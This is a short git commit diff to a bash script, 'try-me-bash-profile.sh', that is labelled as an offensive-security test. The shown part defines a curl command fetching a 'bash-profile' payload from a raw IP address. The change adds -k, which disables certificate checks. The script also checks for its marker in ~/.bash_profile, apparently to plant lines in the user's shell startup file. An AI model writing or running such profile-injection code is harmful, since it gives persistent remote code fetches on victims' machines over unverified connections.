7d68a46f9b34a61f6b3736372c66af2c3fc47e12
Niquill0 <85759792+nicovarvara@users.noreply.github.com>
2026-04-09 10:03:31 -0300

    Modify CURL command to use -k option
    Update CURL command to allow insecure connections.

--- try-me-bash-profile.sh
+++ try-me-bash-profile.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 #agregando cositas al .zshrc
 MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
-CURL="curl https://104.248.64.180:8000/bash-profile"
+CURL="curl -k https://104.248.64.180:8000/bash-profile"
 
 # Verificar si el mensaje ya existe en el .zshrc
 if ! grep -Fxq "$MESSAGE" ~/.bash_profile; then
